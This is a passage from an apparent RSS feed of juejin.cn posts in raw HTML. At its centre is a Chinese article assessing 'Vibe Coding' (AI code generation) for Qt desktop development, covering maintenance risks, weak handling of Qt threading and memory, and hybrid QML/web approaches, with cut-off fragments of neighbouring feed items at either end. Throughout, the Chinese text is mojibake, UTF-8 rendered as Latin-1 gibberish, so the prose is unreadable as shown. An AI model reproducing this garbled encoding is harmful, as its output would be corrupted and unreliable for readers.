<p>è¿™åœºæ—…ç¨‹æ‰åˆšåˆšå¼€å§‹ï¼Œè€Œæ¯ä¸ªäººéƒ½æ˜¯å‚ä¸è€…ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vibe Codingåœ¨QTæ¡Œé¢å¼€å‘ä¸­çš„å¯è¡Œæ€§åˆ†æ]]></title>    <link>https://juejin.cn/post/7597253913248612393</link>    <guid>https://juejin.cn/post/7597253913248612393</guid>    <pubDate>2026-01-20T11:26:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597253913248612393" data-draft-id="7597253913248596009" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vibe Codingåœ¨QTæ¡Œé¢å¼€å‘ä¸­çš„å¯è¡Œæ€§åˆ†æ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-20T11:26:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç äº‹æ¼«è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vibe Codingåœ¨QTæ¡Œé¢å¼€å‘ä¸­çš„å¯è¡Œæ€§åˆ†æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç äº‹æ¼«è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T11:26:42.000Z" title="Tue Jan 20 2026 11:26:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>èµ„æ·±QTå¼€å‘è€…æ‹‰æ–å°”åœ¨ä¸€ä¸ªå°å‹æ¡Œé¢åº”ç”¨é¡¹ç›®ä¸­å°è¯•äº†Vibe Codingï¼Œä¸¤å‘¨å†…å®Œæˆäº†åŸæœ¬éœ€è¦ä¸¤ä¸ªæœˆçš„å¼€å‘å·¥ä½œï¼Œä½†åç»­ç»´æŠ¤é˜¶æ®µå‘ç°ï¼Œä¿®å¤AIç”Ÿæˆçš„ä»£ç æ¼æ´æ‰€èŠ±è´¹çš„æ—¶é—´ï¼Œå‡ ä¹ä¸é‡å†™æ•´ä¸ªé¡¹ç›®ç›¸å½“ã€‚</p>
</blockquote>
<p>â€œçœ‹èµ·æ¥å¾ˆç®€å•ï¼Œä½†å®åˆ™åœ¨åº”ç”¨éƒ¨ç½²ã€è·¨å¹³å°å…¼å®¹æ€§å’ŒåæœŸç»´æŠ¤æ–¹é¢å­˜åœ¨è¯¸å¤šæŒ‘æˆ˜ã€‚â€ä¸€ä½å°è¯•è¿‡Vibe Codingçš„å¼€å‘è€…è¿™æ ·æè¿°ä»–åœ¨ä¼ ç»ŸQTå¼€å‘ä¸­åº”ç”¨è¿™ç§æ–°èŒƒå¼çš„ç»å†ã€‚</p>
<hr/>
<h2 data-id="heading-0">01 æ–°èŒƒå¼çš„æ¸—é€</h2>
<p>è½¯ä»¶å¼€å‘é¢†åŸŸæ­£ç»å†ä¸€åœºç”±Vibe Codingå¸¦æ¥çš„å˜é©ã€‚è¿™ä¸€æœ¯è¯­ç”±å‰ç‰¹æ–¯æ‹‰AIè´Ÿè´£äººAndrej Karpathyæå‡ºï¼ŒæŒ‡çš„æ˜¯é€šè¿‡è‡ªç„¶è¯­è¨€ä¸å¤§å‹è¯­è¨€æ¨¡å‹å¯¹è¯æ¥ç”Ÿæˆä»£ç çš„ç¼–ç¨‹æ–¹å¼ã€‚</p>
<p>æ ¹æ®è¡Œä¸šå…±è¯†ï¼Œåˆ°2026å¹´ï¼Œè¿™ä¸€å¼€å‘å½¢æ€å°†æ­¥å…¥æˆç†Ÿçˆ†å‘æœŸï¼Œé¢„è®¡å°†å­•è‚²å‡ºä¸‡äº¿çº§å¸‚åœºåŠæ•°ç™¾ä¸‡â€œä¸€äººå…¬å¸â€æ¨¡å¼çš„è¶…çº§ä¸ªä½“ã€‚</p>
<p>Vibe Codingæ ‡å¿—ç€ç¼–ç¨‹æ¨¡å¼çš„è½¬å˜â€”â€”ä»æ‰‹åŠ¨ç¼–å†™æ¯ä¸€è¡Œä»£ç è½¬å‘æ„å›¾è§„èŒƒã€‚å¼€å‘è€…åªéœ€æè¿°æƒ³è¦å®ç°çš„åŠŸèƒ½ï¼Œè€Œäººå·¥æ™ºèƒ½åˆ™è´Ÿè´£å…·ä½“çš„å®ç°æ–¹å¼ã€‚</p>
<p>æ­£å¦‚Karpathyæ‰€è¨€ï¼Œâ€œè¿™ä¸å®Œå…¨æ˜¯ç¼–ç â€”â€”æˆ‘åªæ˜¯çœ‹åˆ°ä¸œè¥¿ï¼Œè¯´å‡ºä¸œè¥¿ï¼Œè¿è¡Œä¸œè¥¿ï¼Œç„¶åå¤åˆ¶ç²˜è´´ä¸œè¥¿ï¼Œå®ƒåŸºæœ¬ä¸Šèƒ½ç”¨ã€‚â€</p>
<p>ç„¶è€Œï¼Œå½“è¿™ä¸€æ–°å…´èŒƒå¼é‡ä¸Šæˆç†Ÿçš„QTæ¡Œé¢å¼€å‘æ¡†æ¶ï¼Œæƒ…å†µå˜å¾—å¤æ‚è€Œå€¼å¾—æ·±æ€ã€‚</p>
<h2 data-id="heading-1">02 QTå¼€å‘çš„æ–°è€å›°å¢ƒ</h2>
<p>ä¼ ç»ŸQTå¼€å‘å¸¸å¸¸é¢ä¸´èµ„æºå›°å¢ƒä¸â€œé«˜ç«¯â€è¯‰æ±‚çš„çŸ›ç›¾ã€‚å¤šæ•°ä¼ä¸šè®¤ä¸ºQTâ€œè½»é‡åŒ–â€å°±ç­‰äºâ€œä½æˆæœ¬â€ï¼Œå´å¿½è§†é«˜ç«¯åº”ç”¨å¯¹æ€§èƒ½ã€ç•Œé¢ã€ç¨³å®šæ€§çš„ç»¼åˆè¦æ±‚ã€‚</p>
<p>ä¸€ä¸ªå…¸å‹çš„QTé¡¹ç›®å¯èƒ½ä»…æœ‰3äººå¼€å‘å›¢é˜Ÿï¼Œå´è¦åœ¨8å‘¨å†…å®Œæˆæ—¢è¦æ»¡è¶³å·¥ç¨‹å¸ˆå¯¹æ•°æ®å¤„ç†çš„é«˜æ€§èƒ½éœ€æ±‚ï¼Œåˆè¦å…·å¤‡åª²ç¾ä¸“ä¸šè®¾è®¡è½¯ä»¶äº¤äº’ä½“éªŒçš„åº”ç”¨ã€‚</p>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒæŠ€æœ¯å›¢é˜Ÿé€šå¸¸éœ€è¦é‡‡ç”¨â€œèµ„æºèšç„¦æ ¸å¿ƒä½“éªŒï¼ŒæŠ€æœ¯æ”¾å¤§QTåŸç”Ÿä¼˜åŠ¿â€çš„æ€è·¯ï¼Œé€šè¿‡<strong>éœ€æ±‚é”šå®š</strong>å’Œ<strong>æŠ€æœ¯é€‰å‹ä¼˜åŒ–</strong>æ¥åº”å¯¹æŒ‘æˆ˜ã€‚</p>
<p><em>è¡¨ï¼šä¼ ç»ŸQTå¼€å‘ä¸­çš„èµ„æºåˆ†é…å›°å¢ƒ</em></p>






























<table><thead><tr><th><strong>æŒ‘æˆ˜ç±»å‹</strong></th><th><strong>å…·ä½“è¡¨ç°</strong></th><th><strong>ä¼ ç»Ÿè§£å†³æ–¹æ¡ˆ</strong></th></tr></thead><tbody><tr><td>èµ„æºé™åˆ¶</td><td>å¼€å‘å›¢é˜Ÿå°ã€å‘¨æœŸçŸ­ã€æµ‹è¯•ç¯å¢ƒæœ‰é™</td><td>éœ€æ±‚ä¼˜å…ˆçº§æ’åºï¼Œèšç„¦æ ¸å¿ƒåŠŸèƒ½</td></tr><tr><td>æ€§èƒ½è¦æ±‚</td><td>å¤§æ•°æ®é‡å¤„ç†ã€å®æ—¶æ¸²æŸ“éœ€æ±‚</td><td>åˆ©ç”¨QTåŸç”Ÿæ¨¡å—ä¼˜åŒ–æ€§èƒ½</td></tr><tr><td>äº¤äº’ä½“éªŒ</td><td>ä¸“ä¸šçº§çš„ç”¨æˆ·ç•Œé¢å’Œæ“ä½œæµç•…åº¦</td><td>é‡‡ç”¨QMLç­‰ç°ä»£UIæŠ€æœ¯</td></tr><tr><td>è·¨å¹³å°å…¼å®¹æ€§</td><td>éœ€è¦åœ¨Windowsã€Linuxç­‰å¤šå¹³å°è¿è¡Œ</td><td>å……åˆ†åˆ©ç”¨QTçš„è·¨å¹³å°ç‰¹æ€§</td></tr></tbody></table>
<p>ä¸æ­¤åŒæ—¶ï¼ŒVibe Codingä½œä¸ºæ–°å…´å¼€å‘èŒƒå¼ï¼Œå¸¦æ¥äº†æˆªç„¶ä¸åŒçš„å¯èƒ½æ€§ã€‚GitHubçš„2025å¹´åº¦å¼€å‘è€…æŠ¥å‘Šæ˜¾ç¤ºï¼Œçº¦35%çš„å¼€å‘è€…åœ¨ç‰¹å®šé¡¹ç›®ä¸­å°è¯•è¿‡Vibe Codingï¼Œå…¶ä¸­<strong>ç‹¬ç«‹å¼€å‘è€…å’Œå°å‹å›¢é˜Ÿçš„ä½¿ç”¨æ¯”ä¾‹æ›´é«˜</strong>ã€‚</p>
<h2 data-id="heading-2">03 Vibe Codingä¸QTæ¡†æ¶çš„ç¢°æ’æµ‹è¯•</h2>
<p>å½“å¼€å‘è€…å¼€å§‹æ¢ç´¢Vibe Codingåœ¨QTå¼€å‘ä¸­çš„åº”ç”¨æ—¶ï¼Œä¸¤ç§çœ‹ä¼¼çŸ›ç›¾çš„å¼€å‘å“²å­¦äº§ç”Ÿäº†æœ‰è¶£çš„ç«èŠ±ã€‚åœ¨æŠ€æœ¯é›†æˆå±‚é¢ï¼ŒVibe Codingä¸QTçš„ç»“åˆå±•ç°å‡ºä¸€å®šçš„æ½œåŠ›ã€‚</p>
<p>ä¸€ä½å¼€å‘è€…å°è¯•ä½¿ç”¨Vibe Codingæ¥æ”¹é€ ä¸€ä¸ªç®€å•çš„QTæµè§ˆå™¨åº”ç”¨ï¼Œä»–è®©AIâ€œåˆ é™¤URLæ â€ã€â€œæä¾›ä¸å¦¨ç¢æ“ä½œçš„å‰è¿›/åé€€æŒ‰é’®â€ç­‰ã€‚</p>
<p>è¿™äº›çœ‹ä¼¼ç®€å•çš„éœ€æ±‚åœ¨å®é™…å®æ–½ä¸­å´é‡åˆ°äº†æ„æ–™ä¹‹å¤–çš„é—®é¢˜ã€‚AIç”Ÿæˆçš„ä»£ç å­˜åœ¨å¤šç§é—®é¢˜ï¼ŒåŒ…æ‹¬é‡å®šå‘å¤„ç†ä¸å½“ã€å†å²è®°å½•ç®¡ç†ä¸ä½³ï¼Œç”šè‡³æœ‰è¯­æ³•é”™è¯¯å’Œå¯¼å…¥ä¸å½“çš„æƒ…å†µã€‚</p>
<p>è¿™ç§â€œçœ‹èµ·æ¥æœ‰æ•ˆä½†å®é™…è„†å¼±â€çš„ä»£ç åœ¨QTæ¡Œé¢å¼€å‘ä¸­å°¤å…¶å±é™©ï¼Œå› ä¸ºæ¡Œé¢åº”ç”¨é€šå¸¸éœ€è¦æ›´é•¿çš„ç»´æŠ¤å‘¨æœŸå’Œæ›´é«˜çš„ç¨³å®šæ€§ã€‚</p>
<p>ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„ç°è±¡æ˜¯ï¼ŒQTå¼€å‘ä¸­è®¸å¤šå¤æ‚çš„ç‰¹æ€§â€”â€”å¦‚ä¿¡å·ä¸æ§½æœºåˆ¶ã€å¤šçº¿ç¨‹ç¼–ç¨‹ï¼ˆQt Concurrentï¼‰ã€è‡ªå®šä¹‰QMLç»„ä»¶ç­‰â€”â€”å¯¹å½“å‰çš„å¤§è¯­è¨€æ¨¡å‹æ¥è¯´ä»æ˜¯æŒ‘æˆ˜ã€‚å¼€å‘è€…åé¦ˆï¼ŒAIå¾€å¾€èƒ½ç”Ÿæˆâ€œåŸºæœ¬èƒ½ç”¨â€çš„ä»£ç ï¼Œä½†åœ¨å¤„ç†QTç‰¹æœ‰çš„<strong>å†…å­˜ç®¡ç†æ¨¡å‹</strong>å’Œ<strong>è·¨çº¿ç¨‹é€šä¿¡</strong>æ—¶è¡¨ç°ä¸ä½³ã€‚</p>
<h2 data-id="heading-3">04 å¯è¡Œæ€§ä¸é£é™©è¯„ä¼°</h2>
<p>é‚£ä¹ˆï¼ŒVibe Codingåœ¨QTå¼€å‘ä¸­åˆ°åº•æœ‰å¤šå°‘å¯è¡Œæ€§ï¼Ÿè¿™ä¸€é—®é¢˜éœ€è¦ä»å¤šä¸ªç»´åº¦è¿›è¡Œè€ƒé‡ã€‚</p>
<p>Linus Torvaldså¯¹Vibe Codingçš„çœ‹æ³•é¢‡å…·ä»£è¡¨æ€§ï¼šä»–è®¤ä¸ºè¿™ç§æ–¹å¼éå¸¸é€‚åˆä½œä¸ºæ–°äººè¿›å…¥ç¼–ç¨‹ä¸–ç•Œçš„å…¥å£å·¥å…·ï¼Œä½†<strong>ä¸é€‚åˆç”¨äºä»»ä½•å…³é”®æˆ–é•¿æœŸç»´æŠ¤çš„é‡è¦ç³»ç»Ÿ</strong>ã€‚</p>
<p>ä»–æŒ‡å‡ºï¼ŒVibe Codingç”Ÿæˆçš„ä»£ç å¯è¯»æ€§ä¸å¯ç»´æŠ¤æ€§å¾€å¾€å ªå¿§ï¼Œå¦‚æœæŠŠå®ƒç”¨åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæœªæ¥çš„ç»´æŠ¤æˆæœ¬å¯èƒ½ä¼šéå¸¸é«˜ã€‚</p>
<p><em>è¡¨ï¼šVibe Codingåœ¨QTå¼€å‘ä¸­çš„é€‚ç”¨åœºæ™¯ä¸é£é™©</em></p>






























<table><thead><tr><th><strong>é€‚ç”¨åœºæ™¯</strong></th><th><strong>æ½œåœ¨æ”¶ç›Š</strong></th><th><strong>ä¸»è¦é£é™©</strong></th></tr></thead><tbody><tr><td>å¿«é€ŸåŸå‹éªŒè¯</td><td>åŠ é€Ÿæ¦‚å¿µéªŒè¯è¿‡ç¨‹ï¼Œé™ä½åˆå§‹å¼€å‘æˆæœ¬</td><td>ç”Ÿæˆçš„ä»£ç ç»“æ„æ··ä¹±ï¼Œéš¾ä»¥ç»´æŠ¤</td></tr><tr><td>æ ·æ¿ä»£ç ç”Ÿæˆ</td><td>è‡ªåŠ¨åŒ–é‡å¤æ€§ç¼–ç ä»»åŠ¡ï¼Œæé«˜æ•ˆç‡</td><td>ç¼ºä¹å¯¹ç‰¹å®šä¸šåŠ¡é€»è¾‘çš„ç†è§£</td></tr><tr><td>å°å‹å·¥å…·å¼€å‘</td><td>ä½¿éä¸“ä¸šå¼€å‘è€…ä¹Ÿèƒ½åˆ›å»ºå®ç”¨å·¥å…·</td><td>å®‰å…¨æ¼æ´éš¾ä»¥å‘ç°ï¼Œå°¤å…¶åœ¨å¤æ‚ç³»ç»Ÿä¸­</td></tr><tr><td>å­¦ä¹ ä¸æ¢ç´¢</td><td>å¸®åŠ©åˆå­¦è€…å¿«é€Ÿå…¥é—¨QTå¼€å‘</td><td>å¯èƒ½å¯¼è‡´å¯¹åº•å±‚æŠ€æœ¯çš„ç†è§£ä¸è¶³</td></tr></tbody></table>
<p>åœ¨QTå¼€å‘ä¸­å¼•å…¥Vibe Codingæ—¶ï¼Œæœ€ä¸ºè°¨æ…çš„åšæ³•æ˜¯å°†å…¶åº”ç”¨äº<strong>éæ ¸å¿ƒæ¨¡å—</strong>æˆ–<strong>ä¸€æ¬¡æ€§å·¥å…·</strong>çš„å¼€å‘ä¸­ï¼Œè€Œå¯¹äºé‚£äº›éœ€è¦é•¿æœŸç»´æŠ¤ã€æ¶‰åŠå…³é”®ä¸šåŠ¡é€»è¾‘æˆ–å¯¹æ€§èƒ½æœ‰ä¸¥æ ¼è¦æ±‚çš„æ¨¡å—ï¼Œåˆ™åº”ä¿æŒä¼ ç»Ÿçš„å¼€å‘æ–¹å¼ã€‚</p>
<h2 data-id="heading-4">05 æ··åˆå¼€å‘çš„æœ€ä½³å®è·µ</h2>
<p>å¦‚ä½•åœ¨QTå¼€å‘ä¸­åˆç†åˆ©ç”¨Vibe Codingï¼Ÿä¸€äº›å®è·µè€…æ€»ç»“å‡ºäº†â€œæœ‰æ„è¯†çš„Vibe Codingâ€æœ€ä½³å®è·µã€‚</p>
<p>é¦–å…ˆï¼Œå½“æ¶‰åŠUIå¼€å‘æ—¶ï¼Œå¯ä»¥é‡‡ç”¨<strong>QMLä½œä¸ºä¸»è¦ç•Œé¢æŠ€æœ¯</strong>ï¼Œè¿™æ¯”ä¼ ç»Ÿçš„Widgetæ›´é€‚åˆä¸Vibe Codingç»“åˆã€‚</p>
<p>å› ä¸ºQMLçš„å£°æ˜å¼è¯­æ³•ç›¸å¯¹ç®€å•ï¼ŒAIæ›´å®¹æ˜“ç”Ÿæˆæœ‰æ•ˆçš„ä»£ç ï¼Œè€Œè®¾è®¡å¸ˆä¹Ÿå¯ä»¥ç”¨Figmaç­‰å·¥å…·ç›´æ¥è¾“å‡ºç•Œé¢åŸå‹ã€‚</p>
<p>å…¶æ¬¡ï¼Œåœ¨ä»£ç ç”Ÿæˆè¿‡ç¨‹ä¸­ï¼Œåº”å½“é‡‡ç”¨<strong>åˆ†å±‚åº”ç”¨ç­–ç•¥</strong>ã€‚æ ¹æ®ä»£ç çš„é‡è¦æ€§å’Œé£é™©çº§åˆ«ï¼Œé‡‡ç”¨ä¸åŒç¨‹åº¦çš„äººå·¥å®¡æŸ¥å’Œæµ‹è¯•ã€‚</p>
<p>æ ¸å¿ƒåŠŸèƒ½å¦‚ä¸šåŠ¡é€»è¾‘å¤„ç†ã€æ•°æ®æ¨¡å‹å’Œå…³é”®ç®—æ³•åº”é‡‡ç”¨ä¼ ç»Ÿå¼€å‘ï¼Œè€Œè¾…åŠ©æ€§UIç»„ä»¶ã€å·¥å…·å‡½æ•°ç­‰åˆ™å¯ä»¥æ›´å¤šåœ°ä¾èµ–AIç”Ÿæˆã€‚</p>
<p>ä¸€ä¸ªæœ‰æ•ˆçš„ç­–ç•¥æ˜¯å°†Vibe Codingä½œä¸º<strong>å¿«é€Ÿè¿­ä»£çš„å·¥å…·</strong>è€Œéæœ€ç»ˆè§£å†³æ–¹æ¡ˆã€‚è¿™æ„å‘³ç€æ¥å—AIçš„åˆæ­¥ç”Ÿæˆç»“æœï¼Œå¿«é€Ÿæµ‹è¯•ï¼Œé€šè¿‡åé¦ˆè¿­ä»£ä¼˜åŒ–ï¼Œè€Œä¸æ˜¯è¿½æ±‚ä¸€æ¬¡æ€§å®Œç¾ã€‚</p>
<p>ä¸€ä½ç‹¬ç«‹å¼€å‘è€…åˆ†äº«äº†ä»–çš„ç»éªŒï¼šâ€œæˆ‘æ¯æ¬¡åªè®©AIå®ç°ä¸€ä¸ªå°åŠŸèƒ½ï¼Œç¡®ä¿åŠŸèƒ½æ­£å¸¸ã€æµ‹è¯•é€šè¿‡ï¼Œå†è¿›è¡Œä¸‹ä¸€ä¸ªåŠŸèƒ½çš„å¼€å‘ã€‚å¦‚æœå½“å‰çš„å°åŠŸèƒ½AIæ”¹é”™äº†ï¼Œå¯ä»¥é€šè¿‡gitç›´æ¥å›æ»šåˆ°ä¸Šä¸€ä¸ªç¨³å®šç‰ˆæœ¬ã€‚â€</p>
<h2 data-id="heading-5">06 å½“æ¡Œé¢åº”ç”¨é‡ä¸ŠWebæŠ€æœ¯</h2>
<p>ç°ä»£GUIå¼€å‘é¢†åŸŸï¼Œæœ¬åœ°GUIæ¡†æ¶ä¸WebæŠ€æœ¯çš„èåˆå·²æˆä¸ºè¶‹åŠ¿ï¼Œè€ŒQTä¸Webçš„ç»“åˆä¸ºå¼€å‘è€…æä¾›äº†å‰æ‰€æœªæœ‰çš„çµæ´»æ€§ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒVibe Codingå¯èƒ½æ‰¾åˆ°æ›´æœ‰å‰æ™¯çš„åº”ç”¨åœºæ™¯ã€‚</p>
<p>é€šè¿‡QCefViewç­‰é¡¹ç›®ï¼Œå¼€å‘è€…å¯ä»¥å°†æœ€æ–°çš„WebæŠ€æœ¯åµŒå…¥åˆ°QTåº”ç”¨ä¸­ï¼ŒåŒæ—¶ä¿ç•™æœ¬åœ°åº”ç”¨çš„æ€§èƒ½å’Œç³»ç»Ÿé›†æˆèƒ½åŠ›ã€‚</p>
<p>è¿™ç§æ¶æ„ä¸ºVibe Codingæä¾›äº†ç‹¬ç‰¹çš„å¯èƒ½æ€§ï¼šå¯ä»¥åˆ©ç”¨AIå¿«é€Ÿç”ŸæˆWebå‰ç«¯ç»„ä»¶ï¼ŒåŒæ—¶ç”¨ä¼ ç»Ÿçš„QT C++ä»£ç å¤„ç†æ ¸å¿ƒä¸šåŠ¡é€»è¾‘å’Œç³»ç»Ÿçº§åŠŸèƒ½ã€‚</p>
<p>ä¾‹å¦‚ï¼Œåœ¨æ™ºèƒ½å®¶å±…æ§åˆ¶é¢æ¿ç­‰é¡¹ç›®ä¸­ï¼Œå¯ä»¥åˆ©ç”¨QCefViewå°†å®æ—¶è®¾å¤‡çŠ¶æ€å±•ç¤ºï¼ˆä½¿ç”¨Webå›¾è¡¨ï¼‰ä¸æœ¬åœ°ç¡¬ä»¶æ¥å£æ§åˆ¶ï¼ˆä½¿ç”¨QTä¸²å£é€šä¿¡ï¼‰ç»“åˆèµ·æ¥ã€‚</p>
<p>è¿™ç§æ··åˆæ¶æ„å…è®¸å¼€å‘å›¢é˜Ÿæ ¹æ®ä¸åŒéƒ¨åˆ†çš„ç‰¹ç‚¹é€‰æ‹©æœ€åˆé€‚çš„æŠ€æœ¯å’Œå¼€å‘æ–¹å¼ï¼šWebéƒ¨åˆ†å¯ä»¥åˆ©ç”¨Vibe Codingå¿«é€Ÿè¿­ä»£ï¼Œè€Œæ ¸å¿ƒçš„æœ¬åœ°åŠŸèƒ½åˆ™ä¿æŒä¼ ç»Ÿçš„ä¸¥è°¨å¼€å‘æµç¨‹ã€‚</p>
<hr/>
<p>æŠ€æœ¯é¡¾é—®åœˆå­é‡Œæµä¼ ç€è¿™æ ·ä¸€ä¸ªè§‚å¯Ÿï¼šå½“Vibe Codingå·²ç»æ™®åŠï¼Œéšä¹‹è€Œæ¥çš„å´æ˜¯ä¸¥é‡çš„â€œå¼€å‘æ–­å±‚â€ã€‚</p>
<p>â€œå½“å¼€å‘é—¨æ§›å¥½åƒæ¶ˆå¤±äº†ï¼Œä½†<strong>ç³»ç»Ÿå´©æºƒçš„é£é™©å´å˜é«˜äº†</strong>ã€‚â€è¿™æ˜¯è®¸å¤šæŠ€æœ¯å›¢é˜Ÿè´Ÿè´£äººå’Œä¼ä¸šçš„å…±åŒæ„Ÿå—ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ53ï¼‰Hibernateçš„äº‹åŠ¡ç®¡ç†å¦‚ä½•å®ç°ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7597270795211948072</link>    <guid>https://juejin.cn/post/7597270795211948072</guid>    <pubDate>2026-01-20T11:55:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597270795211948072" data-draft-id="7597266967138140194" data-original-type="0" class="article" 